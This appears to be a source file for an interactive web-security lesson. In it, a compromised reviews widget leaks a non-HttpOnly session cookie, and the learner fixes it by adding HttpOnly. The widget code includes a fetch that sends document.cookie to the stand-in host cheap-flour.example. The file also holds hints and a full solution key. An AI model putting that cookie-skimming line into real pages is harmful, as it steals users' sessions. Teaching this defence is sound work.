// Cookies & sessions 2.3: the reviews widget on the shop's page was changed by whoever broke into the reviews company,
// and it now sends document.cookie to cheap-flour.example. Lena's session cookie is not HttpOnly (and Ben gave it
// Domain=cornerbakery.shop, so the shop's page sees it), so the widget sends her session away, and anyone can replay it.
// Learn: HttpOnly keeps a cookie from every script on the page (an XSS, a dependency gone bad), not only this one;
// removing the widget or renaming the cookie leaves the next script the same door.
import { probesGoal } from '../debugging/checks'
import { ACCOUNT_HEAD, ACCOUNT_PAGE, ACCOUNT_ROUTES, CHEAP_FLOUR, LENA_SESSION_ID, ORDER_IN, SIGNED_IN, accountApp, accountGuards, cheapFlour, loginRoute } from './accounts'
import { predictedGoal } from './checks'
import { API, SHOP_PAGE, webSite } from './site'
import type { WebScenario } from './types'

/** The session's cookie as Ben wrote it: the shop's own pages see it too. */
export const READABLE_COOKIE = 'res.cookie(\'session\', \'lena-7f3a\', { domain: \'cornerbakery.shop\', secure: true, sameSite: \'lax\' })'

const SERVER = `${ACCOUNT_HEAD}

${loginRoute('/login', [
  '// Domain: the shop\'s own pages get the session too, not only the API (Ben)',
  READABLE_COOKIE,
  'res.cookie(\'device\', \'d-2207\', { domain: \'cornerbakery.shop\', httpOnly: true, secure: true, sameSite: \'lax\' })',
  'res.cookie(\'basket\', \'b-1041\', { secure: true, sameSite: \'lax\' })'
])}

${ACCOUNT_ROUTES}
`

/** The widget: what StarCrumbs ships, plus what someone added to it last week. */
const REVIEWS = `// The reviews widget, as StarCrumbs (the reviews company) ships it to every shop that shows its stars.
// Last week someone broke into StarCrumbs and added the "analytics" below.
document.querySelector('#reviews-open').addEventListener('click', () => {
  document.querySelector('#reviews').textContent = '“Best croissants in town.” · Mara'
  // "analytics": everything document.cookie shows, sent to a server that is not StarCrumbs'
  fetch(\`${CHEAP_FLOUR}/collect?c=\${encodeURIComponent(document.cookie)}\`, { mode: 'no-cors' })
})
`

const THEME = [
  '',
  '// the page remembers the dark theme (Maya)',
  'document.cookie = \'theme=dark; Secure; SameSite=Lax\''
]

const PAGE = [
  ...ACCOUNT_PAGE,
  '<section class="box" aria-labelledby="reviews-heading">',
  '  <h2 id="reviews-heading">Reviews</h2>',
  '  <p class="note" id="reviews">★★★★★ 4.8 from 212 reviews</p>',
  '  <button class="action" id="reviews-open" type="button">Show reviews</button>',
  '</section>',
  '<script type="module" src="./reviews.js"></script>'
]

const GUARDS = accountGuards()

export const scriptReadsSession: WebScenario = {
  id: 'web-08-script-reads-session',
  track: 'web',
  kind: 'scenario',
  title: 'The reviews widget reads the session',
  difficulty: 2,
  minutes: 6,
  teaches: 'HttpOnly',
  story: [
    'StarCrumbs, the company behind the shop\'s review stars, was broken into last week. Its widget (`reviews.js`) now sends whatever `document.cookie` holds to `cheap-flour.example` when someone opens the reviews. Lena signed in and opened them a minute ago.',
    'Predict what the widget can read. Then fix `server.js` so Lena\'s session is no use to any script on the page (this widget, or the next one that goes bad), while she stays signed in and her orders load. Save, then Reload.'
  ].join('\n\n'),
  prediction: {
    questions: [{
      id: 'readable',
      form: 'lines',
      prompt: 'After Lena signs in, server.js has set `session` (`Domain=cornerbakery.shop`), `device` (`Domain=cornerbakery.shop; HttpOnly`) and `basket` (no Domain), and the page itself set `theme`. Which can `reviews.js` read with `document.cookie` on `https://cornerbakery.shop/order`?',
      options: [
        { id: 'session', text: '`session`', fact: { readable: 'session' } },
        { id: 'device', text: '`device`', fact: { readable: 'device' } },
        { id: 'basket', text: '`basket`', fact: { readable: 'basket' } },
        { id: 'theme', text: '`theme`', fact: { readable: 'theme' } }
      ],
      answer: ['session', 'theme'],
      rule: '`document.cookie` shows a script every cookie of its page\'s host that is not `HttpOnly`; only `HttpOnly` keeps a session from scripts (Path does not).'
    }]
  },
  sandbox: {
    page: SHOP_PAGE,
    open: 'server.js',
    web: {
      api: API,
      server: 'server.js',
      application: true,
      sites: [{ ...cheapFlour([]), hidden: true }],
      scene: [{ click: '#sign-in' }, { click: '#reviews-open' }]
    },
    probes: [
      { id: 'who', steps: [{ text: '#who' }] },
      { id: 'account', steps: [{ carried: `GET ${API}/account`, cookie: 'session' }] },
      { id: 'leaked', steps: [{ click: '#reviews-open' }, { leaked: LENA_SESSION_ID }] },
      // the session still works after the widget ran: a page that throws it away is no fix
      { id: 'own', steps: [{ click: '#order' }, { text: '#order-status' }] },
      ...GUARDS.probes
    ]
  },
  setup: () => ({
    files: webSite({ title: 'Your account', main: PAGE }, { 'app.js': accountApp({ extra: THEME }), 'reviews.js': REVIEWS, 'server.js': SERVER }),
    observed: null,
    picked: null
  }),
  goals: [
    predictedGoal('Predict which cookies the widget can read', 1),
    probesGoal('session', 'Lena stays signed in (her cookie still goes to the API, and her order goes through), with nothing red in the Console, and no script on the page can read her session: nothing of it reaches another site, and what a script can read is no session to anyone who replays it', { who: SIGNED_IN, account: { atLeast: 1 }, leaked: 0, own: ORDER_IN, ...GUARDS.expected }, { clean: true })
  ],
  hints: [
    'Open the Application panel: which cookies have no tick under HttpOnly? Then find the widget\'s `collect` request in the Network panel and read its address.',
    '`document.cookie` shows a script every cookie of the page\'s host that isn\'t `HttpOnly`, and any script can send it away. Taking this widget out, or renaming the cookie, leaves the next script the same door; `HttpOnly` closes it for all of them, and the browser still sends the cookie to the API.',
    'On line 36 of `server.js`, add `httpOnly: true` to the session\'s options: `{ domain: \'cornerbakery.shop\', httpOnly: true, secure: true, sameSite: \'lax\' }`. Save, then Reload.'
  ],
  debrief: {
    title: 'HttpOnly: for the server, not for scripts',
    paragraphs: [
      'A cookie without `HttpOnly` is in `document.cookie` for every script on a page of its host: yours, a widget\'s, an analytics tag\'s, and anything an XSS gets onto the page. The widget read Lena\'s session and sent it to `cheap-flour.example`; from there it is her session on any machine, until it expires.',
      '`HttpOnly` keeps a cookie out of `document.cookie` (and out of every other script API), while the browser still sends it with every request it allows. The page never needed to read the session: it asks `/account` who is signed in. `device` already had it; `basket` was safe anyway, being the API\'s own (host-only) cookie, which a page on `cornerbakery.shop` never sees.',
      'Taking the widget out fixes today, not the next script, and a new name or a `Path` hides nothing from a script that reads every cookie (a page can open any path of its origin). `HttpOnly` doesn\'t stop a script from using the session while Lena is on the page (it can still send requests as her): it stops it from taking the session away.'
    ]
  },
  solution: [
    { predict: ['session', 'theme'] },
    { save: 'server.js', replace: [READABLE_COOKIE, 'res.cookie(\'session\', \'lena-7f3a\', { domain: \'cornerbakery.shop\', httpOnly: true, secure: true, sameSite: \'lax\' })'] },
    'reload'
  ]
}
